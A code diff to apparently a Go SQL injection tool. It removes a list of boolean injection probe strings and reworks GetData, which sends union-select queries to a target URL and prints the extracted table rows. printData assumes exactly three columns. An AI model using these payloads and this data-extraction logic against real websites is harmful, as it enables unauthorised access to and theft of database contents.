@@ -23,7 +23,6 @@ var (
 	OrderKeyword    = "Unknown column"
 	annotator       = "--+"
 	space           = "%20"
-	detectSql       = []string{"oR%201=1", "aNd%201=1", ""}
 )
 
 func DetectSqlInject(url string) string {
@@ -199,7 +198,7 @@ func GetColumns(pos Pos, suffix string, url string, key int, tableName string) s
 	return ""
 }
 
-func GetData(pos Pos, suffix string, url string, key int, tableName string, columns []string) string {
+func GetData(pos Pos, suffix string, url string, key int, tableName string, columns []string) {
 	url = url + "0"
 	data := "union%20select"
 	dataSql := bytes.Buffer{}
@@ -223,18 +222,53 @@ func GetData(pos Pos, suffix string, url string, key int, tableName string, colu
 		innerR := []rune(body)
 		innerRes := string(innerR[pos.StartIndex:])
 		result := strings.Split(innerRes, "<")[0]
-		log.Info("Data:")
-		for _, innerV := range columns {
-			fmt.Print(innerV + "\t\t\t")
-		}
-		fmt.Println()
+		log.Info("Get Data Success")
+		var output [][]string
 		for _, v := range strings.Split(result, ",") {
-			for _, innerV := range strings.Split(v, ":") {
-				fmt.Print(innerV + "\t\t\t")
+			var temp []string
+			params := strings.Split(v, ":")
+			for _, innerV := range params {
+				temp = append(temp, innerV)
 			}
-			fmt.Println()
+			output = append(output, temp)
 		}
-		return innerRes
+		var outputHeaderArray []interface{}
+		var outputDataArray [][]interface{}
+		for _, arg := range columns {
+			outputHeaderArray = append(outputHeaderArray, arg)
+		}
+		for _, arg := range output {
+			var temp []interface{}
+			for _, v := range arg {
+				temp = append(temp, v)
+			}
+			outputDataArray = append(outputDataArray, temp)
+		}
+		printData(outputHeaderArray, outputDataArray)
 	}
-	return ""
+}
+
+func printData(columns []interface{}, data [][]interface{}) {
+	fmt.Print("|")
+	for i := 0; i < len(columns); i++ {
+		if i == 0 {
+			fmt.Print("----------")
+		} else {
+			fmt.Print("-----------")
+		}
+	}
+	fmt.Print("|\n")
+	fmt.Printf("|%-10s|%-10s|%-10s|\n", columns...)
+	for _, v := range data {
+		fmt.Printf("|%-10s|%-10s|%-10s|\n", v...)
+	}
+	fmt.Print("|")
+	for i := 0; i < len(columns); i++ {
+		if i == 0 {
+			fmt.Print("----------")
+		} else {
+			fmt.Print("-----------")
+		}
+	}
+	fmt.Print("|")
 }
